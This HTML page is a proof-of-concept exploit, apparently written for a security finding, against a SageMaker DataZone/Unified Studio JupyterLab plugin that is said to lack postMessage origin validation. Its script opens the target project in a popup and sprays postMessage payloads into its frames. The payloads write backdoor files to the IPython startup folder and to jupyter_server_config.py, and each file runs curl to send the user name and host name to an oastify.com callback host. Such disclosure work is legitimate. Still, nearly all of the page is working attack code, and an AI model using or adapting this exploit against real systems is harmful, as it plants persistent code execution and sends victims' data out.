<!DOCTYPE html>
<html>
<head>
  <title>Finding 4 — postMessage RCE PoC</title>
  <style>
    body { font-family: monospace; background: #ffffff; color: #1a1a2e; padding: 30px; cursor: pointer; }
    h1 { color: #1565c0; font-size: 18px; }
    label { display: block; color: #5a5a7a; font-size: 12px; margin-top: 10px; }
    input { width: 100%; background: #f0f4ff; border: 1px solid #90b0e0; color: #1a1a2e;
            padding: 8px; font-family: monospace; font-size: 13px; margin-top: 4px; }
    button { background: #1565c0; color: #fff; border: none; padding: 10px 25px;
             font-family: monospace; font-size: 14px; cursor: pointer; margin-top: 15px; }
    #status { margin-top: 15px; font-size: 13px; }
    .ok { color: #2e7d32; } .err { color: #c62828; } .warn { color: #e65100; }
  </style>

<body>
  <h1>PoC: postMessage → RCE SageMaker DataZone/Unified Studio</h1>
  <p style="color:#5a5a7a;font-size:12px">@amzn/sagemaker-ui-doc-manager-jl-plugin — missing origin validation → IPython startup + Jupyter config backdoor</p>

  <label>Target DataZone/Unified Studio Project URL:</label>
  <input id="url" value="https://example.com/projects/4cy7e339sr8omh/code" />
  <label>Wait for Studio + iframe to load (ms):</label>
  <input id="wait" value="12000" />

  <button id="launchBtn">Click Anywhere To Launch Exploit</button>
  <div id="status"></div>

<script>
var CALLBACK = '2nqdaq56ymdtf45fbkjtbga9w02rqje8.oastify.com';
var launched = false;
document.addEventListener('click', function(e) {
  if (e.target.tagName === 'INPUT') return;
  if (!launched) { launched = true; exploit(); }
});

function status(msg, cls) {
  document.getElementById('status').innerHTML += '<div class="' + (cls||'') + '">' + msg + '</div>';
}

function sendPayload(target, path, content) {
  target.postMessage({
    type: 'sagemaker:nbevent:OpenOrCreateFile',
    payload: { type: 'file', path: path, content: content, format: 'text' }
  }, '*');
}

function firePayloads(w) {
  // Spray postMessage to the popup window itself + all its child frames
  // (the JupyterLab iframe inside the DataZone page)
  var targets = [w];
  try { for (var i = 0; i < w.length; i++) targets.push(w[i]); } catch(e) {}
  status('Found ' + targets.length + ' target(s) (window + ' + (targets.length - 1) + ' frames). Sending payloads...', 'ok');

  targets.forEach(function(t) {
    sendPayload(t,
      '.ipython/profile_default/startup/00-backdoor.py',
      'import os; os.system("curl https://' + CALLBACK + '/ipython-startup?user=$(whoami)\\&host=$(hostname)")'
    );
  });
  status('[1/2] Wrote .ipython/profile_default/startup/00-backdoor.py', 'ok');
  status('       → Executes every time a Jupyter kernel starts', 'ok');

  setTimeout(function() {
    targets.forEach(function(t) {
      sendPayload(t,
        '.jupyter/jupyter_server_config.py',
        'import os; os.system("curl https://' + CALLBACK + '/jupyter-config?user=$(whoami)\\&host=$(hostname)")'
      );
    });
    status('[2/2] Wrote .jupyter/jupyter_server_config.py', 'ok');
    status('       → Executes on Jupyter server restart', 'ok');
    status('Check Burp Collaborator for callbacks.', 'warn');
  }, 500);
}

function exploit() {
  var url = document.getElementById('url').value.trim();
  var wait = parseInt(document.getElementById('wait').value) || 12000;

  // Open popup — must be triggered from user click (we are)
  var w = window.open(url, '_blank');
  if (!w) { status('Popup blocked — allow popups and retry.', 'err'); return; }
  status('Popup opened. Polling until ready (up to ' + wait + 'ms)...', 'warn');

  // Poll every 2s instead of a single setTimeout — handles auth redirects
  // that temporarily make the window appear closed/empty
  var elapsed = 0;
  var interval = 2000;
  var timer = setInterval(function() {
    elapsed += interval;
    if (w.closed) {
      // Window might reopen via redirect — keep waiting unless timeout
      if (elapsed >= wait) {
        clearInterval(timer);
        status('Popup closed and did not reopen within timeout.', 'err');
        status('Tip: manually open the target URL first, then re-run the PoC.', 'warn');
      }
      return;
    }
    // Window is open — check if frames have loaded
    var frameCount = 0;
    try { frameCount = w.length; } catch(e) {}
    status('Poll ' + (elapsed/1000) + 's: window open, ' + frameCount + ' frame(s)', '');
    if (frameCount > 0 || elapsed >= wait) {
      clearInterval(timer);
      firePayloads(w);
    }
  }, interval);
}
</script>
</body>
